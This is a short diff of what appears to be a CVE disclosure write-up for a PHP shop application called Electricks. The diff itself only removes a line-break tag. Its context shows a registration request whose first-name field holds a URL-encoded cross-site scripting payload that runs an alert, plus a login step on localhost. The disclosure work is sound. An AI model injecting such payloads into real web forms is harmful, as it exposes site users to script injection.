@@ -46,7 +46,7 @@ Sec-Fetch-User: ?1
 firstname=%3Cvideo%2Fsrc%3Dx+onerror%3Dalert%28document.domain%29%3E&middlename=test3&lastname=test3&email=test3&address=test3&contact=test3&username=test3&password=test&submit=
 ```
 + Go to user login page: "http://localhost/Electricks/Electricks-shop/pages/user_login_page.php" and login.
-<br>
+
 ![3-1](https://github.com/h4md153v63n/CVEs/assets/5091265/931dcbe2-fc38-44ad-b314-a080f8a60cd0)
 <br>
 <br>
